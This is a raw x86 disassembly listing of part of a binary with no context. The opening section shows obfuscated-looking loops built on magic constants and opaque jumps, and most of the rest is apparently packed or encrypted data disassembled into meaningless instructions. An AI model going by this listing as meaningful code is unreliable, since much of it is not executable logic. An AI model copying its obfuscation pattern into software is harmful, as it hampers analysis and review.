  41d678:	fdiv   QWORD PTR [ebp+0x31]
  41d67b:	xchg   edx,eax
  41d67c:	xchg   BYTE PTR [edx-0x63],ah
  41d67f:	or     eax,0x6263a502
  41d684:	xchg   esp,eax
  41d685:	push   ebx
  41d686:	mov    es,WORD PTR [eax]
  41d688:	sar    BYTE PTR [esi-0x3d7e3a44],0xf1
  41d68f:	or     BYTE PTR [edi+0x0],dl
  41d692:	imul   edx,ebx
  41d695:	mov    DWORD PTR [ebp-0x58],edx
  41d698:	mov    edx,DWORD PTR [ebp+0x8]
  41d69b:	mov    ebx,DWORD PTR [ebp-0x54]
  41d69e:	add    edx,0x64f893
  41d6a4:	or     edx,ebx
  41d6a6:	mov    DWORD PTR [ebp-0x54],edx
  41d6a9:	mov    edx,DWORD PTR [ebp+0x8]
  41d6ac:	mov    ebx,DWORD PTR [ebp-0x50]
  41d6af:	add    edx,ecx
  41d6b1:	xor    edx,ebx
  41d6b3:	mov    DWORD PTR [ebp-0x50],edx
  41d6b6:	mov    edx,DWORD PTR [ebp+0x8]
  41d6b9:	mov    ebx,DWORD PTR [ebp-0x4c]
  41d6bc:	add    edx,edi
  41d6be:	and    edx,ebx
  41d6c0:	mov    DWORD PTR [ebp-0x4c],edx
  41d6c3:	mov    edx,DWORD PTR [ebp+0x8]
  41d6c6:	mov    ebx,DWORD PTR [ebp-0x48]
  41d6c9:	lea    edx,[ebx+edx*1+0x241fcde]
  41d6d0:	mov    DWORD PTR [ebp-0x48],edx
  41d6d3:	mov    edx,DWORD PTR [ebp+0x8]
  41d6d6:	mov    ebx,0xfa5e1521
  41d6db:	sub    ebx,edx
  41d6dd:	add    ebx,DWORD PTR [ebp-0x44]
  41d6e0:	mov    DWORD PTR [ebp-0x44],ebx
  41d6e3:	mov    edx,DWORD PTR [ebp+0x8]
  41d6e6:	xor    edx,eax
  41d6e8:	add    edx,esi
  41d6ea:	jne    0x41b310
  41d6f0:	mov    edx,DWORD PTR [ebp-0x14]
  41d6f3:	mov    DWORD PTR [ebp+0x8],edx
  41d6f6:	jmp    0x41d76b
  41d6fb:	mov    edx,DWORD PTR [ebp+0x8]
  41d6fe:	mov    ebx,DWORD PTR [ebp-0x8]
  41d701:	xor    edx,eax
  41d703:	xor    ebx,eax
  41d705:	sub    edx,ebx
  41d707:	sub    edx,esi
  41d709:	xor    edx,eax
  41d70b:	mov    DWORD PTR [ebp+0x8],edx
  41d70e:	mov    edx,DWORD PTR [ebp+0x8]
  41d711:	mov    ebx,DWORD PTR [ebp-0x58]
  41d714:	add    edx,0x5708f1
  41d71a:	imul   edx,ebx
  41d71d:	mov    DWORD PTR [ebp-0x58],edx
  41d720:	mov    edx,DWORD PTR [ebp+0x8]
  41d723:	mov    ebx,DWORD PTR [ebp-0x54]
  41d726:	add    edx,0x64f893
  41d72c:	or     edx,ebx
  41d72e:	mov    DWORD PTR [ebp-0x54],edx
  41d731:	mov    edx,DWORD PTR [ebp+0x8]
  41d734:	mov    ebx,DWORD PTR [ebp-0x50]
  41d737:	add    edx,ecx
  41d739:	xor    edx,ebx
  41d73b:	mov    DWORD PTR [ebp-0x50],edx
  41d73e:	mov    edx,DWORD PTR [ebp+0x8]
  41d741:	mov    ebx,DWORD PTR [ebp-0x4c]
  41d744:	add    edx,edi
  41d746:	and    edx,ebx
  41d748:	mov    DWORD PTR [ebp-0x4c],edx
  41d74b:	mov    edx,DWORD PTR [ebp+0x8]
  41d74e:	mov    ebx,DWORD PTR [ebp-0x48]
  41d751:	lea    edx,[ebx+edx*1+0x241fcde]
  41d758:	mov    DWORD PTR [ebp-0x48],edx
  41d75b:	mov    edx,DWORD PTR [ebp+0x8]
  41d75e:	mov    ebx,0xfa5e1521
  41d763:	sub    ebx,edx
  41d765:	add    ebx,DWORD PTR [ebp-0x44]
  41d768:	mov    DWORD PTR [ebp-0x44],ebx
  41d76b:	mov    edx,DWORD PTR [ebp+0x8]
  41d76e:	xor    edx,eax
  41d770:	add    edx,esi
  41d772:	jne    0x41d6fb
  41d778:	mov    edx,DWORD PTR [ebp-0x8]
  41d77b:	mov    ebx,DWORD PTR [ebp-0xc]
  41d77e:	xor    edx,eax
  41d780:	lea    edx,[edx+ebx*1+0x3272ec]
  41d787:	mov    DWORD PTR [ebp-0xc],edx
  41d78a:	mov    edx,DWORD PTR [ebp-0x10]
  41d78d:	xor    edx,eax
  41d78f:	add    edx,esi
  41d791:	jne    0x418ba5
  41d797:	jmp    0x421f74
  41d79c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d79f:	mov    DWORD PTR [ebp+0x8],ecx
  41d7a2:	jmp    0x41d81b
  41d7a7:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7aa:	mov    edx,DWORD PTR [ebp-0x8]
  41d7ad:	xor    ecx,eax
  41d7af:	xor    edx,eax
  41d7b1:	sub    ecx,edx
  41d7b3:	sub    ecx,esi
  41d7b5:	xor    ecx,eax
  41d7b7:	mov    DWORD PTR [ebp+0x8],ecx
  41d7ba:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7bd:	mov    edx,DWORD PTR [ebp-0x58]
  41d7c0:	add    ecx,0x5708f1
  41d7c6:	imul   ecx,edx
  41d7c9:	mov    DWORD PTR [ebp-0x58],ecx
  41d7cc:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7cf:	mov    edx,DWORD PTR [ebp-0x54]
  41d7d2:	add    ecx,0x64f893
  41d7d8:	or     ecx,edx
  41d7da:	mov    DWORD PTR [ebp-0x54],ecx
  41d7dd:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7e0:	mov    edx,DWORD PTR [ebp-0x50]
  41d7e3:	add    ecx,0x242ebcc
  41d7e9:	xor    ecx,edx
  41d7eb:	mov    DWORD PTR [ebp-0x50],ecx
  41d7ee:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7f1:	mov    edx,DWORD PTR [ebp-0x4c]
  41d7f4:	add    ecx,edi
  41d7f6:	and    ecx,edx
  41d7f8:	mov    DWORD PTR [ebp-0x4c],ecx
  41d7fb:	mov    ecx,DWORD PTR [ebp+0x8]
  41d7fe:	mov    edx,DWORD PTR [ebp-0x48]
  41d801:	lea    ecx,[edx+ecx*1+0x241fcde]
  41d808:	mov    DWORD PTR [ebp-0x48],ecx
  41d80b:	mov    ecx,DWORD PTR [ebp+0x8]
  41d80e:	mov    edx,0xfa5e1521
  41d813:	sub    edx,ecx
  41d815:	add    edx,DWORD PTR [ebp-0x44]
  41d818:	mov    DWORD PTR [ebp-0x44],edx
  41d81b:	mov    ecx,DWORD PTR [ebp+0x8]
  41d81e:	xor    ecx,eax
  41d820:	add    ecx,esi
  41d822:	jne    0x41d7a7
  41d828:	jmp    0x421f80
  41d82d:	mov    ecx,DWORD PTR [ebp+0x8]
  41d830:	mov    edx,DWORD PTR [ebp-0x8]
  41d833:	xor    ecx,eax
  41d835:	xor    edx,eax
  41d837:	sub    ecx,edx
  41d839:	sub    ecx,esi
  41d83b:	xor    ecx,eax
  41d83d:	mov    DWORD PTR [ebp+0x8],ecx
  41d840:	mov    ecx,DWORD PTR [ebp+0x8]
  41d843:	mov    edx,DWORD PTR [ebp-0x58]
  41d846:	add    ecx,0x5708f1
  41d84c:	imul   ecx,edx
  41d84f:	mov    DWORD PTR [ebp-0x58],ecx
  41d852:	mov    ecx,DWORD PTR [ebp+0x8]
  41d855:	mov    edx,DWORD PTR [ebp-0x54]
  41d858:	jmp    0x41fbbb
  41d85d:	bound  ecx,QWORD PTR [ebp+0x70]
  41d860:	push   0x43623b4b
  41d865:	fsub   QWORD PTR [ecx]
  41d867:	xchg   BYTE PTR [edi+0x60],ah
  41d86a:	inc    edx
  41d86b:	hlt    
  41d86c:	imul   ecx,DWORD PTR [ebp+0x307a7dd3],0xc07a7a5f
  41d876:	inc    esp
  41d877:	jp     0x41d8ea
  41d879:	pop    esi
  41d87a:	ins    BYTE PTR es:[edi],dx
  41d87b:	cmp    DWORD PTR [eax+0x3882546b],esp
  41d881:	ins    BYTE PTR es:[edi],dx
  41d882:	xor    DWORD PTR [edi-0x14],ebx
  41d885:	daa    
  41d886:	fld    DWORD PTR [ecx-0x7f0c197e]
  41d88c:	add    al,0xcd
  41d88e:	addr16 mov edi,0xf2c8c625
  41d894:	mov    bl,dh
  41d896:	dec    ebp
  41d897:	ss mov esi,?
  41d89a:	xor    eax,0x6ed84c60
  41d89f:	mov    ebx,DWORD PTR [edx-0x7f]
  41d8a2:	jle    0x41d853
  41d8a4:	xchg   BYTE PTR [ebx+0x72b5e8fd],al
  41d8aa:	das    
  41d8ab:	add    bh,cl
  41d8ad:	jbe    0x41d8b5
  41d8af:	add    BYTE PTR [ecx+ebp*4+0x3f74e09f],0x3c
  41d8b7:	mov    ch,0xfc
  41d8b9:	fs cmp ecx,esi
  41d8bc:	dec    ebp
  41d8bd:	and    ch,dl
  41d8bf:	cmp    DWORD PTR [edi],esp
  41d8c1:	nop
  41d8c2:	test   DWORD PTR [ebx-0x72],edi
  41d8c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c6:	adc    BYTE PTR [edx+0x522c60a4],ah
  41d8cc:	mov    eax,ds:0xecf8211e
  41d8d1:	imul   eax,DWORD PTR [ecx],0x7cf5c3e
  41d8d7:	pop    es
  41d8d8:	jbe    0x41d8b5
  41d8da:	divps  xmm2,XMMWORD PTR [edx+ebx*1]
  41d8de:	sti    
  41d8df:	int3   
  41d8e0:	outs   dx,DWORD PTR ds:[esi]
  41d8e1:	add    eax,0x6207c64f
  41d8e6:	sub    BYTE PTR [edi-0x47d754ef],bh
  41d8ec:	addr16 leave 
  41d8ee:	xchg   DWORD PTR [ecx+ebp*2+0x754ce8bf],esi
  41d8f5:	pop    es
  41d8f6:	pusha  
  41d8f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d8f8:	ins    DWORD PTR es:[edi],dx
  41d8f9:	mov    ch,0xd5
  41d8fb:	mov    ah,0x41
  41d8fd:	fld    DWORD PTR [ecx+0x1f69b52]
  41d903:	or     eax,0xd07341b6
  41d908:	jbe    0x41d904
  41d90a:	bound  edx,QWORD PTR [edi+0x12]
  41d90d:	or     BYTE PTR ds:0x4959da0b,ah
  41d913:	fstp   QWORD PTR [esi-0x68]
  41d916:	pop    edi
  41d917:	pushf  
  41d918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d919:	scas   al,BYTE PTR es:[edi]
  41d91a:	lds    ebp,FWORD PTR [ecx]
  41d91c:	frstor [ecx+0x21b68bfb]
  41d922:	push   ebp
  41d923:	out    0xab,eax
  41d925:	dec    esp
  41d926:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d927:	add    bh,bh
  41d929:	addr16 and edx,eax
  41d92c:	adc    DWORD PTR [esp+edi*8],esp
  41d92f:	push   ecx
  41d930:	out    0xaa,al
  41d932:	add    al,0xcc
  41d934:	js     0x41d931
  41d936:	ror    DWORD PTR [ebx+0x71],1
  41d939:	push   esp
  41d93a:	pop    eax
  41d93b:	push   edi
  41d93c:	lahf   
  41d93d:	cdq    
  41d93e:	stc    
  41d93f:	fld    TBYTE PTR [ebp+0x28412264]
  41d945:	or     BYTE PTR [esi+0x6c],0xa5
  41d949:	push   ss
  41d94a:	inc    ebx
  41d94b:	cwde   
  41d94c:	dec    ebp
  41d94d:	pop    es
  41d94e:	and    BYTE PTR cs:[esi+0x88a94ec],0x12
  41d956:	dec    DWORD PTR [eax]
  41d958:	(bad)  
  41d959:	jnp    0x41d9ac
  41d95b:	lea    edx,[ecx-0x22]
  41d95e:	xchg   BYTE PTR [edi-0x4f],bh
  41d961:	adc    DWORD PTR [esi-0x5ba87ea5],0x47
  41d968:	xchg   BYTE PTR [ebp+0x4],ch
  41d96b:	(bad)  
  41d96c:	push   ds
  41d96d:	shl    BYTE PTR cs:[eax+ebp*8-0x5ec28e96],1
  41d975:	add    DWORD PTR [ebx-0x33],ecx
  41d978:	push   ds
  41d979:	dec    eax
  41d97a:	push   ecx
  41d97b:	pop    ss
  41d97c:	jo     0x41d906
  41d97e:	sbb    BYTE PTR [eax+0x2d],bh
  41d981:	push   ecx
  41d982:	lds    ebp,FWORD PTR [ebp+eiz*1+0x14707678]
  41d989:	jns    0x41d90d
  41d98b:	mov    cl,0xe2
  41d98d:	adc    esi,DWORD PTR [ebp+0x5a]
  41d990:	cmp    dl,BYTE PTR [ecx-0x6a]
  41d993:	(bad)  
  41d994:	jns    0x41da0f
  41d996:	(bad)  
  41d997:	loopne 0x41d9da
  41d999:	sub    eax,0xe7a2e95c
  41d99e:	or     DWORD PTR [eax],edx
  41d9a0:	dec    edx
  41d9a1:	pop    ebx
  41d9a2:	jge    0x41da07
  41d9a4:	je     0x41d9ff
  41d9a6:	fisttp DWORD PTR [eax+ebx*4+0x62]
  41d9aa:	mov    esi,0x91141aad
  41d9af:	ins    DWORD PTR es:[edi],dx
  41d9b0:	ins    DWORD PTR es:[edi],dx
  41d9b1:	cmp    ecx,DWORD PTR [esi+edx*2-0x9]
  41d9b5:	es cmp al,0x4d
  41d9b8:	fild   DWORD PTR [eax-0xf]
  41d9bb:	(bad)  
  41d9bd:	ins    BYTE PTR es:[edi],dx
  41d9be:	cdq    
  41d9bf:	mov    dh,BYTE PTR [esi+0x6c]
  41d9c2:	or     eax,0x6757548d
  41d9c7:	pop    esp
  41d9c8:	push   cs
  41d9c9:	pop    es
  41d9ca:	mov    ds:0x12d10906,eax
  41d9cf:	xlat   BYTE PTR ds:[ebx]
  41d9d0:	mov    cl,0x2
  41d9d2:	xchg   ebx,eax
  41d9d3:	in     eax,0x71
  41d9d5:	sub    ecx,DWORD PTR [ebp+0x580e3ae0]
  41d9db:	retf   
  41d9dc:	jb     0x41d9e0
  41d9de:	cmc    
  41d9df:	mov    cl,0x91
  41d9e1:	jecxz  0x41d970
  41d9e3:	xchg   esi,eax
  41d9e4:	sbb    DWORD PTR [edx-0x2b450996],0xfffffff0
  41d9eb:	cmp    DWORD PTR [eax-0x4783f96a],esi
  41d9f1:	sub    DWORD PTR [edi],0xffffffa1
  41d9f4:	into   
  41d9f5:	leave  
  41d9f6:	inc    edi
  41d9f7:	pop    es
  41d9f8:	rcr    BYTE PTR [edi],0x2e
  41d9fb:	shl    BYTE PTR [ebx-0x1a],1
  41d9fe:	xchg   DWORD PTR [edx+0x5d773363],ebp
  41da04:	out    dx,eax
  41da05:	mov    esp,0x3b928937
  41da0a:	inc    ebx
  41da0b:	aad    0x8
  41da0d:	xchg   BYTE PTR [ebp+0x60],dl
  41da10:	pop    ebp
  41da11:	lods   eax,DWORD PTR ds:[esi]
  41da12:	and    DWORD PTR [ebp-0x4a0999c2],0x3062e889
  41da1c:	add    al,0x10
  41da1e:	push   esp
  41da1f:	and    ebp,esp
  41da21:	or     DWORD PTR [ecx],edi
  41da23:	loop   0x41d9da
  41da25:	mov    eax,0x19623752
  41da2a:	repnz or BYTE PTR [esi],cl
  41da2d:	xor    DWORD PTR [ecx-0x3],eax
  41da30:	or     eax,0xd390ee58
  41da35:	push   0xd615ee8
  41da3a:	js     0x41da63
  41da3c:	fsubr  QWORD PTR [ebx-0x5d]
  41da3f:	xchg   edi,eax
  41da40:	pop    esp
  41da41:	push   0xffffffd4
  41da43:	bound  edi,QWORD PTR [ecx]
  41da45:	cs nop
  41da47:	(bad)  
  41da48:	das    
  41da49:	pushf  
  41da4a:	cmp    BYTE PTR [ebx+eax*1+0x5ea9e39e],dl
  41da51:	adc    eax,0x20e3282f
  41da56:	or     ebx,DWORD PTR [edi]
  41da58:	and    eax,0xe9aa3d2b
  41da5d:	rcl    dl,cl
  41da5f:	xchg   esi,eax
  41da60:	lods   eax,DWORD PTR ds:[esi]
  41da61:	cdq    
  41da62:	jge    0x41dab0
  41da64:	mov    ebx,0xeef88d4f
  41da69:	or     esp,DWORD PTR [edi+edi*8]
  41da6c:	cmp    DWORD PTR [ebp-0x48],esp
  41da6f:	icebp  
  41da70:	jg     0x41da37
  41da72:	cmp    al,0x31
  41da74:	mov    al,ds:0xf3d81971
  41da79:	push   eax
  41da7a:	(bad)  
  41da7b:	(bad)  
  41da7c:	iret   
  41da7d:	fadd   QWORD PTR [edx-0x23]
  41da80:	or     bl,ah
  41da82:	clc    
  41da83:	adc    DWORD PTR [ebp+edx*1+0x4],edx
  41da87:	ret    0xe45e
  41da8a:	rol    DWORD PTR [esi+0x290c5e3a],1
  41da90:	xchg   BYTE PTR [esi-0x7],bl
  41da93:	fwait
  41da94:	pop    eax
  41da95:	adc    dl,BYTE PTR [edi-0x8]
  41da98:	or     eax,0x6125815d
  41da9d:	sar    dh,0x66
  41daa0:	mov    BYTE PTR [ecx-0x3fb19b03],bh
  41daa6:	push   cs
  41daa7:	push   0x5811cda6
  41daac:	les    eax,FWORD PTR [eax+0x3d]
  41daaf:	xor    BYTE PTR [ebp+0x1367c107],0xc1
  41dab6:	mov    al,ds:0x587be9ed
  41dabb:	scas   eax,DWORD PTR es:[edi]
  41dabc:	popf   
  41dabd:	inc    ebp
  41dabe:	xchg   ecx,eax
  41dabf:	ins    BYTE PTR es:[edi],dx
  41dac0:	mov    al,ds:0xbedf8cb4
  41dac5:	sbb    cl,BYTE PTR [ebx-0x7c]
  41dac8:	inc    esi
  41dac9:	add    BYTE PTR [edi+esi*4+0x5743ea27],bl
  41dad0:	fidiv  DWORD PTR [esi+0xc]
  41dad3:	int3   
  41dad4:	mov    ds:0xcad873a9,eax
  41dad9:	ins    DWORD PTR es:[edi],dx
  41dada:	sbb    BYTE PTR [edx-0x4245e86e],0x48
  41dae1:	imul   esi,edx,0x4131982e
  41dae7:	hlt    
  41dae8:	xor    ah,ah
  41daea:	add    eax,0x22f2104c
  41daef:	lods   al,BYTE PTR ds:[esi]
  41daf0:	and    ebx,DWORD PTR [ecx]
  41daf2:	stos   DWORD PTR es:[edi],eax
  41daf3:	mov    al,0xb
  41daf5:	mov    ch,0xd5
  41daf7:	mov    cl,0xd1
  41daf9:	test   al,0xa3
  41dafb:	sbb    eax,0x4ef34c98
  41db00:	sub    ebp,DWORD PTR [ebp-0x5a]
  41db03:	hlt    
  41db04:	shr    DWORD PTR [edi-0x4326c3af],0xca
  41db0b:	pop    edi
  41db0c:	or     eax,0x3e0aa461
  41db11:	jl     0x41daf4
  41db13:	lahf   
  41db14:	(bad)  
  41db15:	cmp    eax,0xf1e09c46
  41db1a:	mov    edi,0xab4114fa
  41db1f:	out    dx,eax
  41db20:	inc    ebp
  41db21:	aaa    
  41db22:	pop    es
  41db23:	and    al,0xf0
  41db25:	xor    BYTE PTR [edi-0x36685807],dh
  41db2b:	push   edx
  41db2c:	loope  0x41dab3
  41db2e:	mov    DWORD PTR [eax+ebx*2+0x26],0x2eae8b38
  41db36:	jmp    0x41dace
  41db38:	jae    0x41db46
  41db3a:	outs   dx,DWORD PTR ds:[esi]
  41db3b:	adc    ebp,DWORD PTR [ebx]
  41db3d:	leave  
  41db3e:	sbb    DWORD PTR [esp+ebp*8],eax
  41db41:	jmp    0x41b1f0d4
  41db46:	mov    dl,0xe6
  41db48:	fs xchg ebp,eax
  41db4a:	inc    ecx
  41db4b:	stos   DWORD PTR es:[edi],eax
  41db4c:	mov    DWORD PTR [esi-0x76],esp
  41db4f:	scas   al,BYTE PTR es:[edi]
  41db50:	and    ecx,DWORD PTR [edi-0x72]
  41db53:	arpl   WORD PTR [esi],sp
  41db55:	push   ss
  41db56:	sub    DWORD PTR [ebp-0x60d32dca],eax
  41db5c:	mov    ebp,0xf212335b
  41db61:	cdq    
  41db62:	push   ss
  41db63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db64:	push   0x79
  41db66:	sub    BYTE PTR [esi+0x4a],dh
  41db69:	or     ah,cl
  41db6b:	sub    ch,BYTE PTR [eax]
  41db6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41db6e:	mov    al,0x3a
  41db70:	pop    ebx
  41db71:	adc    DWORD PTR [ecx],eax
  41db73:	or     al,0x46
  41db75:	je     0x41dbd7
  41db77:	les    ecx,FWORD PTR [ebx]
  41db79:	mov    eax,0x97b3f823
  41db7e:	cmc    
  41db7f:	lahf   
  41db80:	mov    ebp,DWORD PTR [edx+0x10]
  41db83:	and    al,0xab
  41db85:	jmp    0x5d8d:0x5bfab99d
  41db8c:	mov    esp,0xd79c3bfc
  41db91:	addr16 xchg edi,eax
  41db93:	aaa    
  41db94:	adc    edx,ebx
  41db96:	adc    eax,0xe52d7a56
  41db9b:	pop    esi
  41db9c:	mov    al,ds:0xb97df9d0
  41dba1:	mov    fs,WORD PTR ds:0x57c332c
  41dba7:	pop    eax
  41dba8:	sub    DWORD PTR [eax-0x7b],ebp
  41dbab:	pop    ds
  41dbac:	test   BYTE PTR [edi+0x22],dl
  41dbaf:	pop    es
  41dbb0:	pop    eax
  41dbb1:	xor    esi,ebx
  41dbb3:	ret    0x37fa
  41dbb6:	add    bh,ch
  41dbb8:	adc    ebp,DWORD PTR [edx+0x48e33011]
  41dbbe:	mov    ds:0x8462a058,al
  41dbc3:	dec    edx
  41dbc4:	cmp    BYTE PTR [ebx+0x16],dh
  41dbc7:	sub    BYTE PTR [ecx],0xe1
  41dbca:	pop    edi
  41dbcb:	retf   
  41dbcc:	add    ecx,esi
  41dbce:	pop    ss
  41dbcf:	sbb    dh,BYTE PTR ds:0xc2be289f
  41dbd5:	shr    DWORD PTR [edx-0x2c083ff2],1
  41dbdb:	ins    BYTE PTR es:[edi],dx
  41dbdc:	in     eax,dx
  41dbdd:	xchg   ebp,eax
  41dbde:	push   esi
  41dbdf:	loop   0x41dbcf
  41dbe1:	repz adc DWORD PTR [ebp+0x20e2ba8b],0xffffffda
  41dbe9:	xchg   ebp,eax
  41dbea:	xchg   al,bh
  41dbec:	in     al,dx
  41dbed:	not    DWORD PTR [ecx-0x3d]
  41dbf0:	dec    eax
  41dbf1:	cmp    cl,ch
  41dbf3:	leave  
  41dbf4:	cwde   
  41dbf5:	mov    edx,DWORD PTR [ecx+0x13]
  41dbf8:	test   eax,0x733397b2
  41dbfd:	repnz lods al,BYTE PTR ds:[esi]
  41dbff:	(bad)  
  41dc00:	fimul  WORD PTR [esi+0x6ee16bb9]
  41dc06:	outs   dx,BYTE PTR ds:[esi]
  41dc07:	lea    eax,[esi-0x5f]
  41dc0a:	addr16 enter 0xd385,0xd7
  41dc0f:	jmp    0x41dc29
  41dc11:	and    eax,0x95c83864
  41dc16:	xchg   esi,eax
  41dc17:	adc    bh,BYTE PTR [eax+edx*1+0x66ec44da]
  41dc1e:	pop    esp
  41dc1f:	and    bl,BYTE PTR [ebp+ebx*1+0x45f4dd26]
  41dc26:	xchg   edx,eax
  41dc27:	lahf   
  41dc28:	pop    ecx
  41dc29:	sbb    edi,esi
  41dc2b:	jae    0x41dc89
  41dc2d:	jl     0x41dc2e
  41dc2f:	adc    edi,DWORD PTR ds:0xbee0af06
  41dc35:	jp     0x41dc45
  41dc37:	test   BYTE PTR [esi-0x72],bl
  41dc3a:	(bad)  
  41dc3b:	in     eax,dx
  41dc3c:	fstp   TBYTE PTR [edi]
  41dc3e:	(bad)  
  41dc3f:	and    eax,0x97d4334d
  41dc44:	push   ebx
  41dc45:	fucomip st,st(4)
  41dc47:	inc    ecx
  41dc48:	mov    ch,0xc8
  41dc4a:	sbb    DWORD PTR [ebx+edi*1-0x32],esp
  41dc4e:	sub    al,0x3d
  41dc50:	mov    esi,fs
  41dc52:	out    0x78,eax
  41dc54:	sbb    DWORD PTR [ecx-0xf],ebx
  41dc57:	and    BYTE PTR [ecx+0x54],0x9c
  41dc5b:	call   0xeb26c904
  41dc60:	mov    ds:0xcf2b8045,al
  41dc65:	sbb    eax,0xd2ca10ed
  41dc6a:	ja     0x41dce7
  41dc6c:	push   ebp
  41dc6d:	pop    esi
  41dc6e:	dec    esi
  41dc6f:	cmp    eax,0xb91f1348
  41dc74:	sub    dl,ah
  41dc76:	aaa    
  41dc77:	xchg   ebx,eax
  41dc78:	sbb    DWORD PTR [ebp+0x5d],ecx
  41dc7b:	jnp    0x41dca0
  41dc7d:	ds jle 0x41dcad
  41dc80:	and    cl,0xb6
  41dc83:	sahf   
  41dc84:	inc    esi
  41dc85:	mov    ah,0x33
  41dc87:	fcmovne st,st(1)
  41dc89:	clc    
  41dc8a:	test   BYTE PTR [ebx+0x3403bbbe],0xbe
  41dc91:	inc    ecx
  41dc92:	or     DWORD PTR [edi+0x13],edx
  41dc95:	(bad)  
  41dc97:	push   eax
  41dc98:	and    al,0x9f
  41dc9a:	jbe    0x41dc46
  41dc9c:	imul   ecx,DWORD PTR [ebp-0x60],0x5996d179
  41dca3:	mov    ch,0x92
  41dca5:	inc    esp
  41dca6:	xchg   ecx,eax
  41dca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dca8:	lods   al,BYTE PTR ds:[esi]
  41dca9:	scas   al,BYTE PTR es:[edi]
  41dcaa:	jge    0x41dc4f
  41dcac:	pushf  
  41dcad:	jnp    0x41dce4
  41dcaf:	push   cs
  41dcb0:	pusha  
  41dcb1:	or     esp,DWORD PTR [eax+0x64]
  41dcb4:	(bad)  
  41dcb5:	js     0x41dcf4
  41dcb7:	adc    al,BYTE PTR [ebp+0x5d]
  41dcba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcbb:	rcl    esp,cl
  41dcbd:	or     ch,al
  41dcbf:	xor    esi,DWORD PTR [eiz*4+0x209c835f]
  41dcc6:	es pop ebx
  41dcc8:	jo     0x41dd23
  41dcca:	mov    ecx,0xaf6dac2f
  41dccf:	xor    al,0x2
  41dcd1:	and    ah,BYTE PTR [edi-0x389bbf88]
  41dcd7:	jnp    0x41dd12
  41dcd9:	(bad)  
  41dcda:	fistp  WORD PTR [eax]
  41dcdc:	out    dx,al
  41dcdd:	pop    eax
  41dcde:	or     DWORD PTR [edi],esi
  41dce0:	mov    al,0xc3
  41dce2:	or     dh,BYTE PTR [ebx+0x75497fec]
  41dce8:	lock or DWORD PTR [ecx+0x18],edx
  41dcec:	test   eax,0xc23cddca
  41dcf1:	pop    es
  41dcf2:	pop    eax
  41dcf3:	cmp    DWORD PTR [eax+ebx*8-0x46],ebp
  41dcf7:	inc    ebx
  41dcf8:	icebp  
  41dcf9:	inc    esi
  41dcfa:	sub    al,0xad
  41dcfc:	outs   dx,DWORD PTR ds:[esi]
  41dcfd:	(bad)  
  41dcfe:	jge    0x41dd45
  41dd00:	pop    ebx
  41dd01:	test   DWORD PTR [eax],esp
  41dd03:	push   edx
  41dd04:	popf   
  41dd05:	xchg   ebx,eax
  41dd06:	mov    ah,0x47
  41dd08:	loopne 0x41dcdc
  41dd0a:	mov    eax,ds:0x7b7f482e
  41dd0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd10:	loopne 0x41dd1d
  41dd12:	jle    0x41dcba
  41dd14:	fst    QWORD PTR [esp+edx*1-0x1cba0465]
  41dd1b:	mov    ds:0x1e74a8fb,al
  41dd20:	ror    DWORD PTR [ecx-0x3de9b9f],1
  41dd26:	or     ecx,DWORD PTR [ebp+0x56606120]
  41dd2c:	push   ecx
  41dd2d:	mov    WORD PTR ss:[ebp*2+0x3bdda369],cs
  41dd35:	in     eax,dx
  41dd36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd37:	pop    ds
  41dd38:	xor    DWORD PTR gs:0xa2a5144e,esi
  41dd3f:	push   ds
  41dd40:	aad    0xa3
  41dd42:	fdivr  QWORD PTR [edx+ebp*2]
  41dd45:	push   ds
  41dd46:	sbb    eax,0xf5f70e1a
  41dd4b:	mov    eax,0x59777b43
  41dd50:	mov    ebx,0x53334fba
  41dd55:	jo     0x41dd0f
  41dd57:	jae    0x41ddb5
  41dd59:	xor    bh,BYTE PTR [edx+0xc3b0da9]
  41dd5f:	std    
  41dd60:	das    
  41dd61:	icebp  
  41dd62:	pop    esi
  41dd63:	mov    eax,0x2d3d2a3b
  41dd68:	retf   
  41dd69:	cwde   
  41dd6a:	(bad)  
  41dd6b:	lds    ebx,FWORD PTR [ebx+0x67]
  41dd6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dd6f:	cmp    al,0x6
  41dd71:	xor    BYTE PTR [edi+0x51],bl
  41dd74:	push   ebx
  41dd75:	and    ebp,ebp
  41dd77:	popf   
  41dd78:	and    DWORD PTR [eax-0x6e],ebp
  41dd7b:	aam    0xad
  41dd7d:	fnstsw ax
  41dd7f:	sbb    ecx,esi
  41dd81:	ret    
  41dd82:	cmp    esi,DWORD PTR [ebp+0x24230760]
  41dd88:	aaa    
  41dd89:	pop    edx
  41dd8a:	jne    0x41ddbc
  41dd8c:	into   
  41dd8d:	int    0x54
  41dd8f:	jle    0x41ddc0
  41dd91:	repz jae 0x41ddb9
  41dd94:	stos   DWORD PTR es:[edi],eax
  41dd95:	pop    ss
  41dd96:	hlt    
  41dd97:	sub    BYTE PTR [ebx+0x612add11],ah
  41dd9d:	pop    ds
  41dd9e:	out    dx,al
  41dd9f:	add    edi,edi
  41dda1:	mov    ebp,0xeba5bf80
  41dda6:	fsubr  DWORD PTR [ebx-0x52]
  41dda9:	mov    eax,0x21216255
  41ddae:	inc    ebx
  41ddaf:	mov    bh,0x45
  41ddb1:	and    eax,0x56f67335
  41ddb6:	in     al,dx
  41ddb7:	xchg   esp,eax
  41ddb8:	sbb    BYTE PTR [ecx],bl
  41ddba:	push   eax
  41ddbb:	cld    
  41ddbc:	ret    0xb623
  41ddbf:	or     eax,DWORD PTR ss:[esi-0x58]
  41ddc3:	inc    ecx
  41ddc4:	jne    0x41de3e
  41ddc6:	mov    esp,0x2b09d3af
  41ddcb:	pop    edi
